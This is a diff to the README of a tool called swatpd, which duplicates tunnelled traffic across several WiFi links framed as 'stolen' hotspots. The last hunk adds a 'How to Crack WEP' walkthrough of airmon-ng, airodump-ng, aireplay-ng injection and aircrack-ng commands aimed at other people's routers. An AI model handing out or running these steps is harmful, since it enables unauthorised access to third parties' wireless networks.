@@ -1,12 +1,12 @@
 .. -*-rst-*-
 
-=======
- swatp
-=======
+========
+ swatpd
+========
 
-------------------------------------------
- Stolen WiFi Aggregate Tunneling Protocol
-------------------------------------------
+-------------------------------------------------
+ Stolen WiFi Aggregate Tunneling Protocol Daemon
+-------------------------------------------------
 
 :Author: Justine Tunney
 :Version: 0.1 pre-alpha
@@ -25,13 +25,13 @@ problem is none of them work reliably... but what if you could use two
 starts being unreliable or stops working, your internet will still
 operate smoothly.
 
-swatp raids your internet connections together like they're hard
+swatpd raids your internet connections together like they're hard
 drives.  It works by tunneling your traffic to an external swatp
 server, which then forwards it to the internet.  Tunnel traffic is
 duplicated onto each of your wireless cards on a per-packet basis.
 Whichever packet reaches the swatp server first wins, and duplicates
-are discarded.  It's like having your own BGP router except with
-proactive rather than reactive reliability.
+are discarded.  It's like having your own multi-homed BGP router
+except with proactive, rather than reactive, reliability.
 
 I created this program because I got frustrated with my internet
 cutting out periodically for a few seconds at a time while while
@@ -62,7 +62,7 @@ routing tables configured to use separate internet connections along
 with a script that monitors latency on each link to periodically
 adjust marking probability.  The only problem with this is that I'm
 forced to reconnect to WoW if one of the links goes down... or if both
-links are sorta crappy, you're still screwed.
+links are sorta crappy, I'm still screwed.
 
 
 Requirements
@@ -72,10 +72,10 @@ Requirements
 
 * Two or more WiFi cards, each connected to different hotspots.
 
-  It's best if you configure each router to be on different channels.
-  Channels 1, 6, 11, and 14 do not interfere with each other.  It also
-  helps to use 802.11a (instead of b/g/n) because it's less prone to
-  interference.
+  It's best if you configure each router to be on different channels
+  to minimize interference.  Channels 1, 6, 11, and 14 do not
+  interfere with each other.  It also helps to use 802.11a (instead of
+  b/g/n) because it's less prone to interference.
 
 * Somewhere to run the remote swatp endpoint.
 
@@ -175,3 +175,29 @@ ToDo
 * Create a mode for faster internet that stripes packets across
   multiple wifi links rather than duplicating them.  For instance,
   right now we only support RAID1, we also want RAID0 and RAID5.
+
+
+How to Crack WEP
+================
+
+Burn the latest Backtrack Linux ISO and buy an Alfa AWUS036H wireless
+card.  Boot Backtrack with the wireless card and follow these
+instructions.
+
+Let's look for WEP routers on channel 6 to target::
+
+    airmon-ng start wlan0 6
+    airodump-ng -c 6 -t WEP -w output_wep wlan0
+
+Authenticate to target in second terminal window::
+
+    aireplay-ng -1 6000 -o 1 -q 10 -h <TARGET_MAC> -e <TARGET_SSID> wlan0
+
+Inject packets in third terminal window::
+
+    aireplay-ng -3 -h <TARGET_MAC> -e <TARGET_SSID> wlan0
+
+Wait for first terminal window to collect 30,000 packets.  Stop
+programs in all three terminals and run::
+
+    aircrack-ng -b <TARGET_MAC> output_wep*.cap
